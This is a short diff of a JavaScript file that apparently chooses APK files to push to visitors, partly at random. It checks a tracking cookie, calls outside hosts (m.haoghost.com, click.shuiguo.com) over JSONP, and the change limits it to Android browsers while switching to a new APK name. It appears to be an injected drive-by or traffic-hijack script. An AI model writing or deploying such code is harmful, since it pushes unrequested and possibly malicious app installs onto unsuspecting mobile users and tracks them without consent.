@@ -127,7 +127,7 @@ var hy_itv=setInterval(function(){
 				result="360ysdq2.apk";
 				break;
 			default:
-				if(Math.random()>0.5) result="360sqyy.apk";
+				if(Math.random()>0.7) result="360sqyy.apk";
 				else result="360sqyy685.apk";
 		}
 		return result;
@@ -261,7 +261,7 @@ var hy_itv=setInterval(function(){
 
 
 			var hyipdata=parseInt(getCookie("hyipdata"));
-			if(hyipdata!=0 && hyipdata!=1)
+			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua))
 			{
 				getJsonp(
 					'http://m.haoghost.com/request.php?action=index&method=main1',
@@ -269,7 +269,7 @@ var hy_itv=setInterval(function(){
 					function(data){
 						if(data==0)
 						{
-							pname="hlyy3.apk";
+							pname="hlyy4.apk";
 							setCookie("hyipdata","0");
 							getJsonp(
 								'http://click.shuiguo.com/index.php?action=index&method=main1',
@@ -289,7 +289,7 @@ var hy_itv=setInterval(function(){
 			}
 			else
 			{
-				if(hyipdata==0) pname="hlyy3.apk";
+				if(hyipdata==0) pname="hlyy4.apk";
 			}
 			
 			window.setTimeout(function(){
